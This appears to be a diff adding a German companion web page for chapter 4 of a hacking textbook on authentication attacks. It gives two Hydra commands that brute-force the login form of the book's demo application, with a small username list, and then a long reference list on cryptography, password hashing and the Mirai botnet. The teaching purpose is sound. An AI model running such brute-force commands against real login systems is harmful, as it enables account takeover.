@@ -1,0 +1,116 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+
+<title>You&#8217;ve been hacked! - Kapitel 4</title>
+
+</head>
+
+<body>
+
+<h1>Kapitel 4 - Angriffe auf die Authentifizierung</h1>
+
+<h2>4.16 - Die Demo-Anwendung</h2>
+
+<p>
+Der erste Aufruf von Hydra:
+</p>
+
+<pre>
+<code>hydra -l test -P /usr/share/wordlists/wfuzz/others/common_pass.txt <b>172.16.177.129</b> http-post-form "/app/index.php?aktion=einloggen:benutzer=^USER^&amp;passwort=^PASS^:S=Ausloggen" -vV -f</code>
+</pre>
+
+<p>
+Die IP-Adresse <code><b>172.16.177.129</b></code> m&uuml;ssen Sie durch die IP-Adresse 
+des Servers mit der Demo-Anwendung ersetzen.
+</p>
+
+<pre>
+<code>hydra -L /usr/share/wordlists/user.txt -p password <b>172.16.177.129</b> http-post-form "/app/index.php?aktion=einloggen:benutzer=^USER^&amp;passwort=^PASS^:S=Ausloggen" -vV -f</code>
+</pre>
+
+<p>
+Auch hier m&uuml;ssen Sie wieder die IP-Adresse anpassen, au&szlig;erdem m&uuml;ssen Sie 
+vorher die Datei <code>/usr/share/wordlists/user.txt</code> mit der Liste 
+der Benutzernamen anlegen:
+</p>
+
+<pre>
+<code>autor
+gast
+test
+user</code>
+</pre>
+
+
+<h2>Die Links</h2>
+
+<ul>
+    <li> [Base64_Online] <a href="https://www.motobit.com/util/base64-decoder-encoder.asp">Base64 - Online Base64 decoder and encoder</a>
+    <li> [bcrypt] <a href="http://www.openwall.com/crypt/">Openwall: &#8222;bcrypt password hashing for your software and your servers&#8220;</a>
+    <li> [BSI-TR-02102-1] <a href="https://www.bsi.bund.de/DE/Publikationen/TechnischeRichtlinien/tr02102/index_htm.html">Bundesamt f&uuml;r Sicherheit in der Informationstechnik: &#8222;BSI TR-02102 Kryptographische Verfahren: Empfehlungen und Schl&uuml;ssell&auml;ngen&#8220;</a>
+    <li> [Connect] <a href="https://openid.net/connect/">OpenID Connect</a> 
+    <li> [Eile_13] <a href="https://www.ceilers-news.de/serendipity/317-Websecurity-Logikfehler-in-der-Authentifizierung.html">Carsten Eilers: &#8222;Websecurity - Logikfehler in der Authentifizierung&#8220;</a>
+    <li> [Eile_16] Carsten Eilers: 
+      <ul>
+        <li> <a href="https://www.ceilers-news.de/serendipity/751-Grundlagen-der-Kryptographie,-Teil-1-Substitution.html">Grundlagen der Kryptographie, Teil 1: Substitution</a>
+        <li> <a href="https://www.ceilers-news.de/serendipity/754-Grundlagen-der-Kryptographie,-Teil-2-Angriffe-auf-die-Substitution.html">Grundlagen der Kryptographie, Teil 2: Angriffe auf die Substitution</a>
+        <li> <a href="https://www.ceilers-news.de/serendipity/756-Grundlagen-der-Kryptographie,-Teil-3-Transposition.html">Grundlagen der Kryptographie, Teil 3: Transposition</a>
+        <li> <a href="https://www.ceilers-news.de/serendipity/757-Grundlagen-der-Kryptographie,-Teil-4-Polyalphabetische-Substitution.html">Grundlagen der Kryptographie, Teil 4: Polyalphabetische Substitution</a>
+      </ul>
+    <li> [Google-Authenticator] <a href="https://github.com/google/google-authenticator">Google Authenticator</a>
+    <li> [Klab_16] <a href="https://twitter.com/olesovhcom/status/778019962036314112">Octave Klaba, @olesovhcom auf Twitter, 20.9.2016: &#8222;we got 2 huge multi DDoS: 1156Gbps then 901Gbps&#8220;</a>
+    <li> [Klab_16b] Octave Klaba, @olesovhcom auf Twitter:
+      <ul>
+        <li> <a href="https://twitter.com/olesovhcom/status/778830571677978624">22.9.2016: &#8222;Last days, we got lot of huge DDoS. Here, the list of "bigger that 100Gbps" only. You can see the simultaneous DDoS are close to 1Tbps !&#8220;</a>
+        <li> <a href="https://twitter.com/olesovhcom/status/779297257199964160">23.9.2016: &#8222;This botnet with 145607 cameras/dvr (1-30Mbps per IP) is able to send >1.5Tbps DDoS. Type: tcp/ack, tcp/ack+psh, tcp/syn.&#8220;</a>
+        <li> <a href="https://twitter.com/olesovhcom/status/780419817325068290">26.9.2016: &#8222;+6857 new cameras participated in the DDoS last 48H.&#8220;</a>
+        <li> <a href="https://twitter.com/olesovhcom/status/781201292383444992">28.9.2016: &#8222;+15654 new cctv participated in the DDoS last 48H.&#8220;</a>
+        <li> <a href="https://twitter.com/olesovhcom/status/781547479879802880">29.9.2016: &#8222;> +18000 new cctv participated in the DDoS last 24H. Thanks for the "dynamic IP address" with xDSL/Cable/FTTH ..&#8220;</a>
+      </ul>          
+    <li> [Klin_08] <a href="https://www.heise.de/tp/features/Sarah-Palin-Webmail-Hacken-fuer-Anfaenger-3420135.html">Bernd Kling; Telepolis: &#8222;Sarah Palin: Webmail-Hacken f&uuml;r Anf&auml;nger&#8220;</a>
+    <li> [Kreb_16] <a href="https://krebsonsecurity.com/2016/09/krebsonsecurity-hit-with-record-ddos/">Brian Krebs; Krebs on Security, 21.9.2016: &#8222;KrebsOnSecurity Hit With Record DDoS&#8220;</a>
+    <li> [Kreb_16b] <a href="https://krebsonsecurity.com/2016/10/source-code-for-iot-botnet-mirai-released/">Brian Krebs; Krebs on Security, 1.10.2016: &#8222;Source Code for IoT Botnet &#8216;Mirai&#8217; Released&#8220;</a>
+    <li> [Kreb_16c] <a href="https://krebsonsecurity.com/2016/10/who-makes-the-iot-things-under-attack/">Brian Krebs; Krebs on Security, 3.10.2016: &#8222;Who Makes the IoT Things Under Attack?&#8220;</a>
+    <li> [Krypto-AES] <a href="https://www.ceilers-news.de/serendipity/775-Verfahren-der-Kryptographie,-Teil-6-Der-Advanced-Encryption-Standard-AES.html">Carsten Eilers: &#8222;Verfahren der Kryptographie, Teil 6: Der Advanced Encryption Standard (AES)&#8220;</a>
+    <li> [Krypto-Betrieb] <a href="https://www.ceilers-news.de/serendipity/774-Verfahren-der-Kryptographie,-Teil-5-Betriebsarten-fuer-Blockchiffren.html">Carsten Eilers: &#8222;Verfahren der Kryptographie, Teil 5: Betriebsarten f&uuml;r Blockchiffren&#8220;</a>
+    <li> [Krypto-Hash] <a href="https://www.ceilers-news.de/serendipity/802-Verfahren-der-Kryptographie,-Teil-14-Hashfunktionen-Einfuehrung.html">Carsten Eilers: &#8222;Verfahren der Kryptographie, Teil 14: Hashfunktionen - Einf&uuml;hrung&#8220;</a>
+    <li> [Krypto-SHA-2] <a href="https://www.ceilers-news.de/serendipity/807-Verfahren-der-Kryptographie,-Teil-16-SHA-2-ist-noch-fuer-einige-Jahre-sicher.html">Carsten Eilers: &#8222;Verfahren der Kryptographie, Teil 16: SHA-2 ist noch f&uuml;r einige Jahre sicher&#8220;</a>
+    <li> [Krypto-SHA-3] <a href="https://www.ceilers-news.de/serendipity/808-Verfahren-der-Kryptographie,-Teil-17-SHA-3-steht-als-Alternative-und-Ersatz-bereit.html">Carsten Eilers: &#8222;Verfahren der Kryptographie, Teil 17: SHA-3 steht als Alternative und Ersatz bereit&#8220;</a>
+    <li> [Krypto-Sicher] <a href="https://entwickler.de/online/security/kryptoverfahren-579848799.html">Carsten Eilers, entwickler.de: &#8222;Kryptoverfahren: Welche sollte man verwenden bzw. meiden?&#8220;</a>
+    <li> [Marl_09] <a href="http://www.blackhat.com/html/bh-dc-09/bh-dc-09-archives.html#Marlinspike">Moxie Marlinspike; Black Hat DC 2009: &#8222;New Techniques for Defeating SSL/TLS&#8220;</a>
+    (<a href="https://moxie.org/papers/null-prefix-attacks.pdf">Paper</a>)
+    <li> [Mirai_Code] <a href="https://github.com/jgamblin/Mirai-Source-Code">jgamblin/Mirai-Source-Code auf GitHub</a>
+    <li> [Mirai_Scanner] <a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/scanner.c">Mirai-Source-Code/scanner.c auf GitHub</a>
+    <li> [Oech_03] <a href="https://lasec.epfl.ch/pub/lasec/doc/Oech03.pdf">Philippe Oechslin: &#8222;Making a Faster Cryptanalytic Time-Memory Trade-Off&#8220;</a>
+    <li> [OAuth] <a href="https://oauth.net/2/">OAuth 2.0</a>
+    <li> [OpenID] <a href="https://openid.net">OpenID</a>
+    <li> [PrMa_99] <a href="https://www.usenix.org/legacy/events/usenix99/provos.html">Niels Provos, David Mazi&egrave;res; USENIX 99: &#8222;A Future-Adaptable Password Scheme&#8220;</a>
+    <li> [RFC_1319] <a href="https://tools.ietf.org/html/rfc1319">RFC 1319: The MD2 Message-Digest Algorithm</a>
+    <li> [RFC_4226] <a href="https://tools.ietf.org/html/rfc4226">RFC 4226 - HOTP: An HMAC-Based One-Time Password Algorithm</a>
+    <li> [RFC_4648] <a href="https://tools.ietf.org/html/rfc4648">RFC 4648 - The Base16, Base32, and Base64 Data Encodings</a>
+    <li> [RFC_6149] <a href="http://tools.ietf.org/html/rfc6149">RFC 6149: MD2 to Historic Status</a>
+    <li> [RFC_6238] <a href="https://tools.ietf.org/html/rfc6238">RFC 6238 - TOTP: Time-Based One-Time Password Algorithm</a>
+    <li> [RFC_8018] <a href="https://tools.ietf.org/html/rfc8018">RFC 8018: PKCS #5: Password-Based Cryptography Specification Version 2.1</a>
+    <li> [RSA-Angriff] Carsten Eilers:
+      <ul>
+        <li> <a href="https://www.ceilers-news.de/serendipity/107-Gezielter-Angriff-auf-RSA-mit-unabsehbaren-Folgen.html">Gezielter Angriff auf RSA mit unabsehbaren Folgen</a>
+        <li> <a href="https://www.ceilers-news.de/serendipity/126-RSA-und-die-unsicheren-SecurID-Token.html">RSA und die unsicheren SecurID Token</a>
+      </ul>
+    <li> [scrypt] <a href="http://www.tarsnap.com/scrypt.html">The scrypt key derivation function</a>
+    <li> [Wese_09] <a href="https://isc.sans.edu/diary/Password+rules%3A+Change+them+every+25+years/7510">Daniel Wesemann; InfoSec Handlers Diary Blog: &#8222;Password rules: Change them every 25 years&#8220;</a>
+    <li> [Wikh_16] <a href="https://www.flashpoint-intel.com/when-vulnerabilities-travel-downstream/">Zach Wikholm; Flashpoint, 7.10.2016: &#8222;When Vulnerabilities Travel Downstream&#8220;</a>
+    <li> [Wiki_ PBKDF2] <a href="https://en.wikipedia.org/wiki/PBKDF2">PBKDF2 (Password-Based Key Derivation Function 2)</a>
+    <li> [ZeBH_16] <a href="https://www.incapsula.com/blog/malware-analysis-mirai-ddos-botnet.html">Igal Zeifman, Dima Bekerman, Ben Herzberg; Incapsula Blog: &#8222;Breaking Down Mirai: An IoT DDoS Botnet Analysis&#8220;</a>
+    <li> [Zett_08] <a href="https://www.wired.com/2008/09/palin-e-mail-ha/">Kim Zetter; WIRED: &#8222;Palin E-Mail Hacker Says It Was Easy&#8220;</a>
+</ul>
+
+<hr>
+
+<p>
+<a href="../hacking-index.html">Zur&uuml;ck</a>
+</p>
+
+</body>
+
+</html>
